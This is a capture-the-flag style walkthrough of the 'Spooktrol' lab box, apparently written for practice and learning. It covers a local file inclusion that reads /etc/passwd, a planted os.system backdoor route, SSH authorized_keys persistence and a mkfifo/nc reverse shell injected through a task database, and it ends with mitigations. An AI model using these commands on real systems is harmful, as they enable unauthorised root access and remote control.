# Spooktrol

- Introduction
- Summary
- Walkthrough
- Mitigation
- References 

## Introduction 

The Spooktrol Box gives an interesting and different look at a non-typical target giving an insight into a particular use case.

## Summary 

The box starts off simple with an easy to find local file inclusion vulnerability. This leads to the reveal of the different functions and "safe" guards of the server. With the gathered information it was possible to write files to the target server and insert a backdoor. Full access to the server was achieved by adding a public key to the authorized_keys file. This gave root access to a container. Finally to get control over the containers host the tester entered a malicious entry into a database which is executed by an process running as root.

## Spooktrol

The tester started with an "nmap" scan, that revealed three open ports.

```
└─$ ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.123 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) ; nmap -p $ports -sC -sV 10.10.11.123
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 06:27 EDT
Nmap scan report for 10.10.11.123
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp   open  http    uvicorn
| http-robots.txt: 1 disallowed entry 
|_/file_management/?file=implant
|_http-server-header: uvicorn
|_http-title: Site doesn't have a title (application/json).
| fingerprint-strings: 
|   FourOhFourRequest: 
<snip>
|     Connection: close
|_    {"detail":"Method Not Allowed"}
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 16:77:76:8a:65:a3:db:23:11:21:66:6e:e4:c3:f2:32 (RSA)
|   256 61:92:eb:7a:a9:14:d7:60:51:00:0c:44:21:a2:61:08 (ECDSA)
|_  256 75:c1:96:9c:69:aa:c8:74:ef:4f:72:bd:62:53:e9:4c (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=9/24%Time=66F2940A%P=x86_64-pc-linux-gnu%r(G
<snip>
SF:type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"detail\":\"
SF:Not\x20Found\"}");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.14 seconds
                                                                  
```

The tester navigated to port 80, which was one of the ports found. The port was running a web server which hosted an API. The tester checked the "robots.txt" file and found the "Disallow: /file_management/?file=implant" entry. This endpoint returned the text output of a executable file. 

```
┌──(kali㉿kali)-[~]
└─$ curl  http://10.10.11.123/file_management/?file=implant --output -
ELF>�@@�7@8@)(@@�
                 %�
                   % �
                      %�
                        ��
                          ����� ��@�@DD�
                                        %�
                                          ��
                                            �pQ�tdR�td�
                                                       %�
<snip>
```

As this indicates a potential local file inclusion (LFI) vulnerability. The tester attempted to access the "passwd" file, on the target. This worked and the tester received the desired file.

```
└─$ curl  http://10.10.11.123/file_management/?file=../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
                                                      
```

The tester used the vulnerability to find sensitive files. As the response headers indicated the server was running python the tester searched for relevant files and file types. 

```
curl  http://10.10.11.123/file_management/?file=../app/main.py        
from typing import Optional
from fastapi import File, UploadFile, Request 
from fastapi import FastAPI

<snip>

@app.get("/file_management/")
async def download_file(file):
    file_path = "files/" + file
    return FileResponse(file_path)

@app.put("/file_upload/")
async def file_upload(request: Request, file: UploadFile = File(...)):
    auth = request.headers.get("Cookie")[5:]
    # We are divisible by 42
    if int(auth, 16) % 42 != 0:
        return JSONResponse(status_code=500, content={'message': 'Internal Server Error'})
    try:
        os.mkdir("files")
        print(os.getcwd())
    except Exception as e:
        print(e)
    file_name = os.getcwd() + "/files/" + file.filename.replace(" ", "-")
    try:
        with open(file_name,'wb+') as f:
            f.write(file.file.read())
            f.close()
    except:
        return JSONResponse(status_code=500, content={'message': 'Internal Server Error'})
    return JSONResponse(status_code=200, content={'message': 'File upload successful /file_management/?file=' + file.filename.replace(" ", "-") })
                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ 
```

The tester discovered the "main.py" file. This file shows the main functions of the server. The file revealed that there was a file upload feature on the server. As the "download_file" was vulnerable LFI and directory transversal, and nothing in the code indicated over wise, the tester assumed the upload feature was also vulnerable. This could allow the tester, in combination with the upload feature, to write files to the server. 

The upload feature is "protected" with a basic authentication cookie requirement. As commented in the code, the supplied cookie must be dividable by 42 and hex encoded. Therefore the tester crafted the below test payload with a "auth" cookie, that was divisible by 42. The payload would upload a text file to the "tmp" directory. The tester checked the success of the test using the LFI vulnerability. 

![LFI_test](https://i.imgur.com/zjNkDyP.png)

```
┌──(kali㉿kali)-[~]
└─$ curl  http://10.10.11.123/file_management/?file=../../../../tmp/test.txt 
This is a test!
```

As the test payload was successful the tester used the same method to uploaded an edited version of the "main.py" file. The edit added an additional function to the end of the code, which is shown below:

```
@app.get("/cmd")
async def command(cmd):
	x = os.system(cmd)
	return x
```

This addition adds a command execution feature to the server allowing commands to be executed on the server.
![Main_edit](https://i.imgur.com/Dt5jLk8.png)

As the "cmd" function doesn't give detailed output the tester used the "wget" command to make a request to the testers system to test the function. The tester set a python HTTP server to "catch" the "wget" request. 

```
┌──(kali㉿kali)-[~]
└─$ curl  http://10.10.11.123/cmd?cmd=wget%20http://10.10.14.8:8081/test.txt 
2048                     
```

```
└─$ python -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.123 - - [26/Sep/2024 12:32:32] code 404, message File not found
10.10.11.123 - - [26/Sep/2024 12:32:32] "GET /test.txt HTTP/1.1" 404 -
```

Now that the tester had limited command execution on the system the tester moved to get interactive access. This was done by uploading the tester's "public" SSH key. This process involved generating a private/public key pair using the linux "ssh-keygen" command. Once that was done the tester wrote the "PUBLIC" key to the targets "authorized_keys" file in the ".ssh" folder.

```
┌──(kali㉿kali)-[~]
└─$ curl -v "http://10.10.11.123/cmd?cmd=echo%20ssh-ed25519%20AAAAC3NzaC1lZDI1NTE5AAAAIBazeqhvhd3%2bQm29pAFW/QwKZfLkM7LCPj0xqrBkPQJ3%20kali@kali%20>%20/root/.ssh/authorized_keys"
*   Trying 10.10.11.123:80...
* Connected to 10.10.11.123 (10.10.11.123) port 80
> GET /cmd?cmd=echo%20ssh-ed25519%20AAAAC3NzaC1lZDI1NTE5AAAAIBazeqhvhd3%2bQm29pAFW/QwKZfLkM7LCPj0xqrBkPQJ3%20kali@kali%20>%20/root/.ssh/authorized_keys HTTP/1.1
> Host: 10.10.11.123
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< date: Thu, 26 Sep 2024 16:53:10 GMT
< server: uvicorn
< content-length: 1
< content-type: application/json
< 
* Connection #0 to host 10.10.11.123 left intact
0                                                        
```

*note, The tester had to URL encode the "+" in the middle of the public key, as this is a space in URL encoding, therefore would have broken the key. 
```
┌──(kali㉿kali)-[~]
└─$ curl  http://10.10.11.123/file_management/?file=../../../../root/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBazeqhvhd3+Qm29pAFW/QwKZfLkM7LCPj0xqrBkPQJ3 kali@kali
```

Once the tester confirmed the upload, the tester was able to login using SSH.
```
└─$ ssh -i '/home/kali/.ssh/persist' root@10.10.11.123 -p 2222
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

<snip>

root@spook2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@spook2:~# hostname
spook2
root@spook2:~# 

```

The tester found the web server files which included a database (DB) file. 
```
root@spook2:~# ls /opt/spook2/
Dockerfile  app  files  server.py  sql_app.db
```

```
┌──(kali㉿kali)-[~/Documents/spooktrol]
└─$ scp  -i '/home/kali/.ssh/persist'  -P 2222 root@10.10.11.123:/opt/spook2/sql_app.db   ./  
sql_app.db                                                                                                                                                           100%   92KB 944.8KB/s   00:00    
```

Loading this DB file into a DB browser showed a series of "checkin" and sessions. This pointed to some sort logging system that logs connections from other systems. The more interesting piece of information is the "tasks" entries that show the output of a "whoami" command.  

![DB_tasks](https://i.imgur.com/5kPQ16L.png)

The "crud.py" file, from the web server, has the code that is used to enter the data into the DB. The code has the status set to "0" and results set to blank. This indicated that the DB is checked for new entries with the status set to "0" and executes any arguments that are present. 

```
def create_task(db, session, task, arg1="", arg2=""):
    db_task = models.Tasks(target=session, status=0, task=task, arg1=arg1, arg2=arg2, result="")
    db.add(db_task)
    db.commit()
    db.refresh(db_task)
    return True
```

The tester performed a test to confirm this was the case. The tester entered the following into the DB to test. This would cause the process that executes the arguments to ping the testers machine.
```
sqlite> insert into tasks (target, status, task, arg1, arg2, result)
   ...> values ('10a6dd5dde6094059db4d23d7710ae12', '0', '1', 'ping -c 3 10.10.14.8', '','');
sqlite> select * from tasks
   ...> ;
1|10a6dd5dde6094059db4d23d7710ae12|1|1|whoami||root

2|10a6dd5dde6094059db4d23d7710ae12|0|1|ping -c 3 10.10.14.8||

```
The test was successful. 
```
┌──(kali㉿kali)-[~/Documents/spooktrol]
└─$ sudo tcpdump -i tun0 icmp                                                                
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:18:02.417517 IP 10.10.11.123 > 10.10.14.8: ICMP echo request, id 1, seq 1, length 64
13:18:02.417544 IP 10.10.14.8 > 10.10.11.123: ICMP echo reply, id 1, seq 1, length 64
13:18:03.420030 IP 10.10.11.123 > 10.10.14.8: ICMP echo request, id 1, seq 2, length 64
13:18:03.420058 IP 10.10.14.8 > 10.10.11.123: ICMP echo reply, id 1, seq 2, length 64
13:18:04.421131 IP 10.10.11.123 > 10.10.14.8: ICMP echo request, id 1, seq 3, length 64
13:18:04.421156 IP 10.10.14.8 > 10.10.11.123: ICMP echo reply, id 1, seq 3, length 64

```
To get a shell on the target the tester used the following command.

```
sqlite> insert into tasks (target, status, task, arg1, arg2, result)
   ...> values ('10a6dd5dde6094059db4d23d7710ae12', '0', '1', 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444 >/tmp/f', '','');
```
This was also success, giving the tester a shell on the box.
```
┌──(kali㉿kali)-[~/Documents/spooktrol]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.123] 46354
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
spooktrol
# 

```
To get a full, interactive shell on the target, the tester, like detailed above, wrote a SSH "Public" key to the authorized_keys file.

```
# pwd
/root/.ssh
# ls -latr
total 0
-rw------- 1 root root   0 Jul  2  2021 authorized_keys
drwx------ 1 root root 172 Oct  1 22:15 ..
drwx------ 1 root root  30 Oct  1 22:44 .
# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBazeqhvhd3+Qm29pAFW/QwKZfLkM7LCPj0xqrBkPQJ3 kali@kali" > /root/.ssh/authorized_keys
# 
```

```
┌──(kali㉿kali)-[~]
└─$ ssh -i '/home/kali/.ssh/persist' root@10.10.11.123 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Oct 25 14:55:25 2021
root@spooktrol:~# id
uid=0(root) gid=0(root) groups=0(root)
root@spooktrol:~# 

```


## Mitigation

-  Avoid allowing user input directly into any inputs and sanitize the inputs that can't be avoided. 
-  Use programming languages built-in features to prevent LFI and other issues.  
-  limit the web server process to its root directory only.
-  Not only run the web service in a container but also run the service as a low level user, not root.
-  Implement a more robust authentication system, which is available for FastAPI.
-  If possible consider using predetermined tasks for check-in systems and run system under a low level user.
-  If feasible, consider limiting network access to the host server in order to reduce exfiltration opportunities.
## References


- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- https://docs.python-requests.org/en/latest/user/authentication/
- https://fastapi.tiangolo.com/reference/security/#fastapi.security.APIKeyQuery.auto_error
- 
